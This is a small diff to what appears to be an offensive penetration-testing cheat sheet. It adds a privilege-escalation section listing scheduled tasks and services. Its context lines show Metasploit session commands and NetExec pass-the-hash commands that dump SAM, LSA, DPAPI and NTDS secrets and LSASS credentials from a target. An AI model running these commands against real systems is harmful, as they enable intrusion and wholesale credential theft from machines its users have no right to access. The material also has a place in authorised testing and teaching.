@@ -500,6 +500,10 @@ background
 sessions
 sessions -i 1
 
+[*] Priviledge Escalation
+schtasks /query /fo LIST /v
+services.msc
+
 [*] Hash Dumping
 nxc smb $TARGET -u '$USERNAME' -H '$HASH' --sam --lsa --dpapi --ntds --local-auth
 nxc smb $TARGET -u '$USERNAME' -H '$HASH' -M lsassy --local-auth
